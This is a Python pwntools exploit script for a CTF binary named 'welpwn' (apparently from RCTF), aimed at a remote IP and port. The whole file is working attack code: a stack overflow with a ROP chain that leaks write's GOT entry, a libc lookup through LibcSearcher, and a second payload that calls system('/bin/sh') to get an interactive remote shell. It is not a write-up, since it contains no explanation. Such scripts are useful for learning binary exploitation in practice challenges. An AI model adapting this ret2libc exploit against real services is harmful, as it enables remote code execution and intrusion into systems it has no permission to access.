from pwn import *
from LibcSearcher import *
context(log_level='debug',terminal=["tmux","splitw","-h"])
binary = "./welpwn"
libc_binary = "/lib/x86_64-linux-gnu/libc.so.6"

# p = process(argv=[binary])
p = remote("220.249.52.133",34887)

elf = ELF(binary)
libc = ELF(libc_binary)

pppp_ret = 0x40089C
write_got = elf.got["write"]
puts_plt = elf.sym["puts"]
pop_rdi = 0x4008a3
main_plt = 0x4007cd
p.recvuntil("Welcome to RCTF\n")
context.arch = "amd64"
payload = flat([
    "a"*24,pppp_ret,
    pop_rdi,write_got,
    puts_plt,
    main_plt
])
# gdb.attach(p)
p.send(payload)
p.recvuntil("\x40")
call_back = u64(p.recv(6).ljust(8,"\x00"))
log.success("write got address -> " + hex(call_back))

libc = LibcSearcher("write",call_back)
libc_base = call_back - libc.dump("write")
system_addr = libc_base + libc.dump("system")
sh_addr = libc_base + libc.dump("str_bin_sh")

# libc_base = call_back-libc.sym["write"]
# system_addr = libc_base + libc.sym["system"]
# sh_addr = libc_base + 0x18cd57
payload = flat([
    "a"*24,pppp_ret,
    pop_rdi,sh_addr,
    system_addr,
    main_plt
])
p.send(payload)
p.interactive()
